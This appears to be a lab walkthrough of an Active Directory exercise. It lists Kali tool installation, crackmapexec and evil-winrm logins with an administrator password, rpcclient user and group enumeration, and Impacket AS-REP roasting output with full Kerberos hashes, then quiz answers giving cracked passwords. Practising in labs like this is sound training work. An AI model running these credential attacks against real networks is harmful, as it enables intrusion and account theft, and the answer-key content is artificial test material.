Installation for Kali 🐲
Copy
apt update
apt install netexec






curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
apt install pipx git
pipx ensurepath
pipx install poetry
poetry self add "poetry-dynamic-versioning[plugin]"
poetry dynamic-versioning enable





 crackmapexec smb 10.201.123.47


  crackmapexec smb 10.201.123.47
SMB         10.201.123.47   445    CONTROLLER-1     [*] Windows 10.0 Build 17763 x64 (name:CONTROLLER-1) (domain:CONTROLLER.local) (signing:True) (SMBv1:False)
                    

crackmapexec smb 10.201.123.47 --shares


crackmapexec smb 10.201.123.47 --shares



$ crackmapexec smb 10.201.123.47 -u Administrator -p 'P@$$W0rd'
SMB         10.201.123.47   445    CONTROLLER-1     [*] Windows 10.0 Build 17763 x64 (name:CONTROLLER-1) (domain:CONTROLLER.local) (signing:True) (SMBv1:False)
SMB         10.201.123.47   445    CONTROLLER-1     [+] CONTROLLER.local\Administrator:P@$$W0rd (Pwn3d!)




 crackmapexec winrm  10.201.123.47 -u Administrator -p 'P@$$W0rd'
SMB         10.201.123.47   5985   CONTROLLER-1     [*] Windows 10.0 Build 17763 (name:CONTROLLER-1) (domain:CONTROLLER.local)
HTTP        10.201.123.47   5985   CONTROLLER-1     [*] http://10.201.123.47:5985/wsman
WINRM       10.201.123.47   5985   CONTROLLER-1     [+] CONTROLLER.local\Administrator:P@$$W0rd (Pwn3d!)




xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.201.123.47 /u:Administrator /p:'P@$$W0rd'



evil-winrm -i 10.201.123.47 -u Administrator -p 'P@$$W0rd' 




pcclient -U ""  10.201.123.47 -N


rpcclient -U 'Administrator%P@$$W0rd'  10.201.123.47     >  user.txt


└─$ cat userK.txt | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' | sponge userK.txt 


rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Machine1] rid:[0x44f]
user:[Machine2] rid:[0x450]
user:[Admin1] rid:[0x451]
user:[Admin2] rid:[0x452]
user:[User1] rid:[0x453]
user:[User2] rid:[0x454]
user:[SQLService] rid:[0x455]
user:[User3] rid:[0x456]
user:[HTTPService] rid:[0x457]
user:[sshd] rid:[0x458]
rpcclient $> 

pcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $> 



rpcclient $> querygroupmem 0x206
        rid:[0x1f4] attr:[0x7]
        rid:[0x451] attr:[0x7]
        rid:[0x452] attr:[0x7]
        rid:[0x455] attr:[0x7]
rpcclient $> 


rpcclient $> queryuser 0x1f4
        User Name   :   Administrator
        Full Name   :
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Tue, 05 Aug 2025 15:27:35 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Mon, 25 May 2020 15:22:39 EDT
        Password can change Time :      Tue, 26 May 2020 15:22:39 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000008
        padding1[0..7]...
        logon_hrs[0..21]..





ython3  GetNPUsers.py -usersfile /home/kali/Downloads/kerberos/userK.txt -no-pass CONTROLLER.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Machine1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Machine2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Admin1 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$Admin2@CONTROLLER.LOCAL:ccd6aa0e219d14f9ff79dd3a7cb6e4fa$acbc76a88368b945f912f56ed7e77a870faea355ab5a2b98d5bff92d62fd8718723114d0f2d94d070bc2c296111ad47b13cc0cfbd17153e215082af5e2470334933681d07fdd40fde2c6707b7e411dd2b33a9951a54dd48660a06b0f8c1ed0622ea62d9ee38d64de1aa4c25138168f6bf5c907feb9e8d38483b735bf112b027bdffa4365b644fac9c52aac4b8809bba29f5e8ddee6065aef1c489ff54326c7864e610df50d6fbc5d7bc901a004f0be94cdcbc979fb849423e0e218b031d7b318d5216de23e8b96fa678b9e468b1b212dc03956324f9150c516ce09a7ff387ab79d29b8d102c5910777443e3ab3f5aae2b189cd6f
[-] User User1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User User2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SQLService doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$User3@CONTROLLER.LOCAL:de68f7ddf0afdefd1da370343fdba3a8$3081a0231cf3b290de4c2ee1722bef56f84d182a3463311a6441e1cfe1db4d788a3275cb4d752a28de8a977466f10e73681c65cfdeefba7b6baf30a3ebb6a50b384bad6e4d2b917afb89a7d79ad90d9745ca7e9403530738a9160c450fb0132dfee20eefbd242530e2783f204404cc84ef2933b80dc7c0b9773ecd9610d5e1aa1627771a17394c3fc74806052b86c1448f69abf79cfb02dfac3c52d168f53e72b363c7aaf9e70bc8b2b520e5b8184542404c821e784f005a312a58a390f7b4f7f0ac9373c444a01ce185efe4fdb777556127490e54c2f5eff5c70cc819d04cefbf86f36526625cba3a30cfaadb6c628e22ddef1f
[-] User HTTPService doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                                                      
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ 











What hash type does AS-REP Roasting use?

Ans: Kerberos 5 AS-REP etype 23

Which User is vulnerable to AS-REP Roasting?

Ans: User3

What is the User’s Password?

Ans: Password3

Which Admin is vulnerable to AS-REP Roasting?

Ans: Admin2

What is the Admin’s Password?

Ans: P@$$W0rd2